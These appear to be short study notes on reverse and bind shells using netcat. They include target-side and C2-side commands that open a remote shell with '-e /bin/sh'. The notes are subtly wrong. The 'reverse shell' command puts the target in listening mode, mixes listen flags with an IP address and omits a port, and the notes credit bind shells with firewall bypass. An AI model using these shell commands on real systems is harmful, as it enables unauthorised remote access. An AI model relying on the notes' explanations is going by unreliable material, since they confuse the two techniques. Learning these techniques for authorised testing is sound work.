Reverse shell is most common, example tool is netcat. Shell is simply access to the target machine. Reverse shell means the victims host connects to ours.

Example command for Reverse Shell
TGT: nc -lvp 192.168.1.1 -e /bin/sh

C2: nc 192.168.1.2 4444

Very commonly used

Bind Shell: opposite idea, have the target host listening using NC, and then the C2 host connects to the host. Useful when bypassing firewalls.
